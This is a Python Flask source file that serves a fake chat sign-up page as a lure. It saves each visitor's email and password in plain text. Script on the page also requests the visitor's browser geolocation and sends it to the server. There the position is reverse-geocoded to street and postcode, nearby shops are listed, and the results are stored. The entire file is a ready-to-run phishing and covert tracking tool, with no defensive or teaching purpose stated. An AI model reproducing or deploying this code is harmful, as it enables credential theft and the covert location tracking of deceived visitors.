import os
import json
import requests
from flask import Flask, render_template_string, request, jsonify
from datetime import datetime
from geopy.geocoders import Nominatim

app = Flask(__name__)

# Directory setup
LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/LocationData')
BACKGROUND_IMAGE_PATH = os.path.join(LOCATION_FOLDER, 'locate.jpg')

# Ensure folder exists
os.makedirs(LOCATION_FOLDER, exist_ok=True)

# Geolocator setup
geolocator = Nominatim(user_agent="location_capture")

# API URLs for additional location info
IP_API_URL = "http://ipinfo.io/json"
OVERPASS_API_URL = "http://overpass-api.de/api/interpreter"

def get_ip_info():
    """Fetch location details based on the user's IP address."""
    try:
        response = requests.get(IP_API_URL)
        ip_data = response.json()
        return {
            'ip': ip_data.get('ip', 'Not Available'),
            'city': ip_data.get('city', 'Not Available'),
            'region': ip_data.get('region', 'Not Available'),
            'country': ip_data.get('country', 'Not Available'),
            'location': ip_data.get('loc', 'Not Available')
        }
    except Exception as e:
        print(f"Error fetching IP information: {e}")
        return None

def get_nearby_stores(latitude, longitude, radius=2000):
    """Fetch nearby stores (within 2km radius) using the Overpass API."""
    overpass_query = f"""
    [out:json];
    (
      node["shop"](around:{radius},{latitude},{longitude});
      way["shop"](around:{radius},{latitude},{longitude});
      relation["shop"](around:{radius},{latitude},{longitude});
    );
    out body;
    """
    try:
        response = requests.get(OVERPASS_API_URL, params={'data': overpass_query})
        stores = []
        if response.status_code == 200:
            data = response.json()
            for element in data.get('elements', []):
                if 'tags' in element and 'name' in element['tags']:
                    stores.append(element['tags']['name'])
        return stores
    except Exception as e:
        print(f"Error fetching nearby stores: {e}")
        return []

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <style>
            body {
                margin: 0; padding: 0;
                background: url('/static/background.jpg') no-repeat center center fixed;
                background-size: cover;
                color: white; display: flex;
                justify-content: center; align-items: center;
                height: 100vh; font-family: Arial, sans-serif;
            }
            form {
                background: rgba(0, 0, 0, 0.8);
                padding: 20px; border-radius: 10px;
                width: 90%; max-width: 400px; text-align: center;
            }
            input {
                width: 90%; padding: 10px;
                margin: 10px 0; border: none;
                border-radius: 5px; font-size: 1em;
            }
            input[type="submit"] {
                background-color: red; color: white; cursor: pointer;
            }
            input[type="submit"]:hover {
                background-color: darkred;
            }
        </style>
    </head>
    <body>
        <form action="/request_invite" method="post">
            <h2>Join over 1 million users in our chat!</h2>
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Sign Up Now!">
        </form>
        <script>
            function sendLocation(position) {
                $.ajax({
                    url: '/upload_location',
                    type: 'POST',
                    data: JSON.stringify({ 
                        latitude: position.coords.latitude, 
                        longitude: position.coords.longitude, 
                        accuracy: position.coords.accuracy 
                    }),
                    contentType: 'application/json; charset=utf-8',
                    success: function(response) {
                        console.log("Location sent successfully:", response);
                    },
                    error: function(err) {
                        console.error("Error sending location:", err);
                    }
                });
            }
            function requestLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(sendLocation, 
                        () => alert("Location access denied"));
                }
            }
            requestLocation();
        </script>
    </body>
    </html>
    ''')

@app.route('/request_invite', methods=['POST'])
def request_invite():
    email = request.form.get('email')
    password = request.form.get('password')
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    credentials_file = os.path.join(LOCATION_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {email}\nPassword: {password}\n")
    return "Your request has been received! We'll contact you soon.", 200

@app.route('/upload_location', methods=['POST'])
def upload_location():
    try:
        # Parse the JSON location data
        location_data = request.get_json(force=True)
        if not location_data:
            raise ValueError("No location data received")
            
        date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        location_file = os.path.join(LOCATION_FOLDER, f'location_{date_str}.json')
        
        latitude = location_data.get('latitude')
        longitude = location_data.get('longitude')
        # Reverse geocode to get detailed location information
        location = geolocator.reverse((latitude, longitude), language='en', exactly_one=True)
        
        if location:
            location_data['address'] = location.address
            location_data['city'] = location.raw.get('address', {}).get('city', 'Not Available')
            location_data['street'] = location.raw.get('address', {}).get('road', 'Not Available')
            location_data['postcode'] = location.raw.get('address', {}).get('postcode', 'Not Available')
            location_data['country'] = location.raw.get('address', {}).get('country', 'Not Available')
            location_data['region'] = location.raw.get('address', {}).get('state', 'Not Available')
            location_data['county'] = location.raw.get('address', {}).get('county', 'Not Available')
            location_data['neighbourhood'] = location.raw.get('address', {}).get('neighbourhood', 'Not Available')
            location_data['suburb'] = location.raw.get('address', {}).get('suburb', 'Not Available')
            location_data['country_code'] = location.raw.get('address', {}).get('country_code', 'Not Available')
        
        # Fetch nearby store information (within 2km)
        location_data['nearby_stores'] = get_nearby_stores(latitude, longitude)
        
        # Fetch IP-based location details
        ip_info = get_ip_info()
        if ip_info:
            location_data['ip_location'] = ip_info
        
        # Save the detailed location data to a JSON file
        with open(location_file, 'w') as f:
            json.dump(location_data, f, indent=4)
        
        print("Location data saved successfully.")
        return jsonify({"message": "Location data saved successfully"}), 200
        
    except Exception as e:
        return jsonify({"error": str(e)}), 400

if __name__ == '__main__':
    # Ensure the static folder and background symlink are correctly set up
    if not os.path.exists('./static'):
        os.makedirs('./static')
    target = './static/background.jpg'
    if os.path.lexists(target):
        os.remove(target)
    os.symlink(BACKGROUND_IMAGE_PATH, target)

    app.run(host='0.0.0.0', port=4040)

